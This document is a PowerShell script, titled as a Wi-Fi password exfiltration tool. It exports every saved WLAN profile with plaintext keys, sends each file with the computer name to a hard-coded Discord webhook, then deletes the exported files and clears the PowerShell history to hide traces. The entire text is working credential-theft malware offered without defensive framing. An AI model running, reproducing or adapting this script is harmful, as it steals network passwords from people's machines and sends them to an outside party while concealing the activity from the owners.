# WLAN-Windows-Passwords-Discord-Exfiltration - FINAL FIXED
$whuri = 'https://discord.com/api/webhooks/1482772602949734664/AfhCMz1wQKiszM25JquwYHfnAfELsXRXbwmk9m9eWwjnF9qQnHTJxqUt_yR-0U_g7KIk'

$exportDir = "$env:temp\SomeStuff"

if (-not (Test-Path $exportDir)) {
    New-Item -ItemType Directory -Path $exportDir -Force | Out-Null
}

netsh wlan export profile key=clear folder=$exportDir | Out-Null

$xmlFiles = Get-ChildItem -Path $exportDir -Filter "*.xml"

if ($xmlFiles.Count -eq 0) {
    Write-Host "No profiles found."
} else {
    foreach ($xmlFile in $xmlFiles) {
        $payload = @{
            username = $env:COMPUTERNAME
            content  = "Wi-Fi Profil von $($env:COMPUTERNAME): $($xmlFile.Name)"
        }
        $json = $payload | ConvertTo-Json -Compress

        Write-Host "Sending JSON: $json"  # Debug

        $boundary = [guid]::NewGuid().ToString()
        $LF = "`r`n"

        $body = @(
            "--$boundary",
            'Content-Disposition: form-data; name="payload_json"',
            '',
            $json,
            "--$boundary",
            "Content-Disposition: form-data; name=`"files[0]`"; filename=`"$($xmlFile.Name)`"",
            'Content-Type: application/octet-stream',
            '',
            [System.IO.File]::ReadAllBytes($xmlFile.FullName),
            "--$boundary--"
        ) -join $LF

        $bodyBytes = [Text.Encoding]::UTF8.GetBytes($body)

        try {
            Invoke-RestMethod -Uri $whuri -Method Post -ContentType "multipart/form-data; boundary=$boundary" -Body $bodyBytes
            Write-Host "Erfolgreich gesendet: $($xmlFile.Name)"
        } catch {
            Write-Host "Fehler für $($xmlFile.Name): $_"
        }

        Start-Sleep -Milliseconds 600  # Avoid rate limit
    }
}

Remove-Item -Path $exportDir -Recurse -Force -ErrorAction SilentlyContinue
Write-Host "Cleanup done."

Clear-History
